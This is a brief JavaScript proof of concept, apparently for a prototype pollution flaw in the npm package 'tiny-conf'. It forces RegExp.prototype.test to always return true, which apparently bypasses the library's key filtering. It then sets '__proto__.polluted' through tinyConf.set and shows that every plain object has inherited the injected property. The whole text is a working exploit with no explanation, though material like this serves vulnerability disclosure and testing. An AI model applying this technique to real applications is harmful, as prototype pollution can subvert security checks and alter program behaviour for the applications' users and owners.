RegExp.prototype.test = () => true;
const tinyConf = require('tiny-conf');
obj = {};
console.log({}.polluted);
tinyConf.set('__proto__.polluted', 'yes');
console.log({}.polluted);